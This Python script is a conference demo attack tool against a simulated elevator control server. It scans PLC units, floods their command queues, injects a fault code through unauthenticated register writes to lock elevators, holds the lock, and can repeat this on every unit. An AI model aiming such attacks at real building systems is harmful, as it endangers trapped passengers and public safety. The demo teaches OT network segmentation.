"""
=============================================================================
 RED TEAM ATTACK TOOL — OT ELEVATOR EXPLOIT
 KipuCon Conference Demo | Sec-Llama
=============================================================================
 Standalone CLI that connects to the elevator server over TCP and executes
 a multi-phase OT attack against building elevator PLCs.

 Usage:
   python attacker_client.py                        # full attack on ELV-1 + persist
   python attacker_client.py --target all            # cascade: kill ALL elevators
   python attacker_client.py --recon-only            # phase 1 only
   python attacker_client.py --flood-only            # phase 2 only
   python attacker_client.py --target 2 --persist    # attack ELV-2 with persistence
   python attacker_client.py --host 192.168.1.100    # remote target
   python attacker_client.py --delay 3               # seconds between phases
=============================================================================
"""

import time
import random
import socket
import argparse
import sys
from datetime import datetime

# Fix Windows console encoding for Unicode characters
if sys.platform == "win32":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace", line_buffering=True)

from ot_protocol import (
    HOST, PORT,
    FC_READ_REGISTERS, FC_WRITE_REGISTER, FC_WRITE_MULTIPLE, FC_LIST_UNITS,
    FC_SET_PHASE,
    HR_FAULT_CODE, REGISTER_NAMES,
    send_message, recv_message,
)


# ── Terminal colors ───────────────────────────────────────────────────────────
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE   = "\033[97m"
    DIM     = "\033[2m"
    BG_RED  = "\033[41m"
    BG_YEL  = "\033[43m"

LOG_WIDTH = 78


def log(msg, color=""):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"{C.DIM}[{ts}]{C.RESET} {color}{msg}{C.RESET}")
    sys.stdout.flush()


def banner(msg, color=C.CYAN):
    bar = "\u2500" * LOG_WIDTH
    print(f"\n{color}{bar}")
    print(f"  {msg}")
    print(f"{bar}{C.RESET}\n")
    sys.stdout.flush()


# ── Attacker Client ──────────────────────────────────────────────────────────
class AttackerClient:
    def __init__(self, host: str = HOST, port: int = PORT):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        self.sock.settimeout(10.0)
        log(f"  [ATTACKER] Connected to {self.host}:{self.port}", C.YELLOW)

    def disconnect(self):
        if self.sock:
            self.sock.close()
            self.sock = None
            log(f"  [ATTACKER] Disconnected", C.DIM)

    def _send(self, msg: dict) -> dict:
        send_message(self.sock, msg)
        resp = recv_message(self.sock)
        if resp is None:
            raise ConnectionError("Server disconnected")
        return resp

    def _set_phase(self, phase: int):
        """Announce attack phase transition to the server."""
        try:
            self._send({"fc": FC_SET_PHASE, "phase": phase})
            phase_names = ["NORMAL", "RECON", "FLOOD", "EXPLOIT", "IMPACT"]
            log(f"  [ATTACKER] Phase → {phase} ({phase_names[phase]})", C.YELLOW)
        except Exception:
            pass  # Non-critical — dashboard just won't update

    # ── Phase 1: Reconnaissance ──────────────────────────────────────────
    def phase_recon(self, target_unit: int = 1):
        banner("ATTACK PHASE 1 \u2014 PASSIVE RECON  (Modbus/TCP scanning)", C.YELLOW)
        self._set_phase(1)

        # List units
        log(f"  [ATTACKER] Sending FC={FC_LIST_UNITS} (List Unit IDs)...", C.YELLOW)
        resp = self._send({"fc": FC_LIST_UNITS})
        units = resp.get("units", [])
        log(f"  [ATTACKER] Discovered {len(units)} PLC unit(s): {units}", C.YELLOW)

        # Read target registers
        log(f"  [ATTACKER] Sending FC={FC_READ_REGISTERS} to unit {target_unit}...",
            C.YELLOW)
        resp = self._send({
            "fc": FC_READ_REGISTERS,
            "unit": target_unit,
        })
        regs = resp.get("registers", {})
        state_name = resp.get("state_name", "?")
        log(f"  [ATTACKER] Sniffed register dump from ELV-{target_unit}:", C.YELLOW)
        for addr_str, val in regs.items():
            addr = int(addr_str)
            name = REGISTER_NAMES.get(addr, f"HR{addr}")
            display = f"0x{val:02X}" if name == "fault_code" else str(val)
            log(f"    HR{addr} = {display:>8}  ({name})", C.YELLOW)
        log(f"  [ATTACKER] State: {state_name}", C.YELLOW)
        log(f"  [ATTACKER] {C.RED}No authentication required \u2014 "
            f"writable registers exposed{C.RESET}", C.YELLOW)
        return units

    # ── Phase 2: Command Buffer Flood ────────────────────────────────────
    def phase_flood(self, target_unit: int = 1, count: int = 24, delay: float = 0.05):
        banner("ATTACK PHASE 2 \u2014 COMMAND BUFFER FLOOD  (OT DoS)", C.RED)
        self._set_phase(2)
        log(f"  [ATTACKER] Flooding ELV-{target_unit} command queue "
            f"({count} commands)...", C.RED)

        accepted = 0
        rejected = 0
        for i in range(count):
            fake_floor = random.randint(1, 10)
            resp = self._send({
                "fc": FC_WRITE_MULTIPLE,
                "unit": target_unit,
                "floor": fake_floor,
            })
            status = resp.get("status", "ERROR")
            if status == "ACCEPTED":
                accepted += 1
                tag = f"{C.GREEN}ACCEPTED{C.RESET}"
            else:
                rejected += 1
                tag = f"{C.BG_YEL}REJECTED{C.RESET}"
            log(f"  [ATTACKER] WRITE FC={FC_WRITE_MULTIPLE} \u2192 "
                f"floor={fake_floor:02d}  [{tag}]", C.RED)
            time.sleep(delay)

        log(f"  [ATTACKER] Flood complete: {accepted} accepted, "
            f"{rejected} rejected", C.RED)

    # ── Phase 3: Exploit (kill shot) ─────────────────────────────────────
    def phase_exploit(self, target_unit: int = 1):
        banner("ATTACK PHASE 3 \u2014 FAULT REGISTER WRITE  (Impact)", C.RED)
        self._set_phase(3)
        log(f"  [ATTACKER] Writing fault_code=0x10 to ELV-{target_unit} "
            f"HR4 (no auth required on Modbus/TCP)", C.RED)

        resp = self._send({
            "fc": FC_WRITE_REGISTER,
            "unit": target_unit,
            "address": HR_FAULT_CODE,
            "value": 0x10,
        })
        status = resp.get("status", "ERROR")
        log(f"  [ATTACKER] Response: {status}", C.RED)
        if status in ("FAULT_INJECTED", "REFRESHED"):
            self._set_phase(4)
        log(f"  {C.BG_RED}[IMPACT]{C.RESET}{C.RED} ELV-{target_unit} "
            f"LOCKED. Passengers trapped. Manual reset required.", C.RED)

    # ── Phase 4: Persistence ─────────────────────────────────────────────
    def phase_persist(self, target_unit: int = 1, duration: float = 60.0,
                      interval: float = 2.0):
        banner("ATTACK PHASE 4 \u2014 PERSISTENCE  (Maintaining fault)", C.RED)
        log(f"  [ATTACKER] Maintaining LOCKED_FAULT on ELV-{target_unit} "
            f"(re-writing HR4 every {interval}s, Ctrl+C to stop)", C.RED)

        start = time.time()
        count = 0
        try:
            while time.time() - start < duration:
                resp = self._send({
                    "fc": FC_WRITE_REGISTER,
                    "unit": target_unit,
                    "address": HR_FAULT_CODE,
                    "value": 0x10,
                })
                count += 1
                status = resp.get("status", "ERROR")
                elapsed = time.time() - start
                log(f"  [ATTACKER] PERSIST #{count} FC={FC_WRITE_REGISTER} "
                    f"HR4=0x10 [{status}] (t+{elapsed:.0f}s)", C.RED)
                time.sleep(interval)
        except KeyboardInterrupt:
            log(f"\n  [ATTACKER] Persistence interrupted by operator "
                f"(sent {count} refresh packets)", C.YELLOW)

    # ── Phase 5: Cascade (all elevators) ─────────────────────────────────
    def phase_cascade(self, units: list, delay_between: float = 2.0):
        banner("ATTACK PHASE 5 \u2014 CASCADE  (Building shutdown)", C.RED)
        log(f"  [ATTACKER] Initiating cascade attack on ALL elevators: {units}",
            C.RED)

        for unit in units:
            log(f"\n  [ATTACKER] \u2500\u2500\u2500 Targeting ELV-{unit} "
                f"\u2500\u2500\u2500", C.RED)
            self.phase_exploit(target_unit=unit)
            if unit != units[-1]:
                time.sleep(delay_between)

        log(f"\n  {C.BG_RED}[IMPACT]{C.RESET}{C.RED} ALL {len(units)} "
            f"ELEVATORS LOCKED \u2014 BUILDING SHUTDOWN{C.RESET}", C.RED)
        banner("CASCADE COMPLETE \u2014 Full building elevator system offline",
               C.RED)


# ── Main ─────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="OT Elevator Attack Tool \u2014 KipuCon / Sec-Llama")
    parser.add_argument("--host", default=HOST,
                        help=f"Target host (default: {HOST})")
    parser.add_argument("--port", type=int, default=PORT,
                        help=f"Target port (default: {PORT})")
    parser.add_argument("--target", default="1",
                        help="Target unit: 1, 2, 3, or 'all' (default: 1)")
    parser.add_argument("--delay", type=float, default=2.0,
                        help="Seconds between phases (default: 2)")
    parser.add_argument("--persist", action="store_true",
                        help="Maintain persistence after exploit")
    parser.add_argument("--persist-duration", type=float, default=120.0,
                        help="Persistence duration in seconds (default: 120)")
    parser.add_argument("--persist-interval", type=float, default=2.0,
                        help="Persistence re-write interval (default: 2s)")
    parser.add_argument("--recon-only", action="store_true",
                        help="Phase 1 only (reconnaissance)")
    parser.add_argument("--flood-only", action="store_true",
                        help="Phase 2 only (command buffer flood)")
    parser.add_argument("--flood-count", type=int, default=24,
                        help="Number of flood commands (default: 24)")
    args = parser.parse_args()

    target_all = args.target.lower() == "all"
    target_unit = 1 if target_all else int(args.target)

    banner("OT ELEVATOR ATTACK TOOL\n"
           "  Sec-Llama | KipuCon Conference\n"
           f"  Target: {args.host}:{args.port} | "
           f"Unit: {'ALL' if target_all else target_unit} | "
           f"Persist: {'YES' if args.persist else 'NO'}",
           C.RED)

    client = AttackerClient(host=args.host, port=args.port)

    try:
        client.connect()
        time.sleep(0.5)

        # Phase 1: Recon
        units = client.phase_recon(target_unit=target_unit if not target_all else 1)

        if args.recon_only:
            banner("RECON COMPLETE \u2014 exiting (--recon-only)", C.YELLOW)
            client.disconnect()
            return

        time.sleep(args.delay)

        if args.flood_only:
            client.phase_flood(target_unit=target_unit, count=args.flood_count)
            banner("FLOOD COMPLETE \u2014 exiting (--flood-only)", C.YELLOW)
            client.disconnect()
            return

        # Phase 2: Flood
        client.phase_flood(target_unit=target_unit if not target_all else 1,
                           count=args.flood_count)
        time.sleep(args.delay)

        if target_all:
            # Phase 5: Cascade — kill all elevators
            client.phase_cascade(units=units, delay_between=args.delay)
        else:
            # Phase 3: Exploit
            client.phase_exploit(target_unit=target_unit)

        # Phase 4: Persistence (optional)
        if args.persist:
            time.sleep(args.delay)
            if target_all:
                # Persist on all units in round-robin
                banner("PERSISTENCE \u2014 Maintaining fault on ALL elevators", C.RED)
                start = time.time()
                count = 0
                try:
                    while time.time() - start < args.persist_duration:
                        for u in units:
                            resp = client._send({
                                "fc": FC_WRITE_REGISTER,
                                "unit": u,
                                "address": HR_FAULT_CODE,
                                "value": 0x10,
                            })
                            count += 1
                            status = resp.get("status", "ERROR")
                            elapsed = time.time() - start
                            log(f"  [ATTACKER] PERSIST ELV-{u} #{count} "
                                f"[{status}] (t+{elapsed:.0f}s)", C.RED)
                        time.sleep(args.persist_interval)
                except KeyboardInterrupt:
                    log(f"\n  [ATTACKER] Persistence interrupted ({count} packets)",
                        C.YELLOW)
            else:
                client.phase_persist(target_unit=target_unit,
                                     duration=args.persist_duration,
                                     interval=args.persist_interval)

        if not args.persist:
            log(f"\n  [ATTACKER] Attack complete. Disconnecting.", C.RED)
            banner("ATTACK COMPLETE \u2014 This is why OT network segmentation matters",
                   C.RED)

    except ConnectionRefusedError:
        log(f"  [ATTACKER] Connection refused \u2014 is elevator_server.py running?",
            C.RED)
        sys.exit(1)
    except KeyboardInterrupt:
        log(f"\n  [ATTACKER] Interrupted by operator", C.YELLOW)
    finally:
        client.disconnect()


if __name__ == "__main__":
    main()
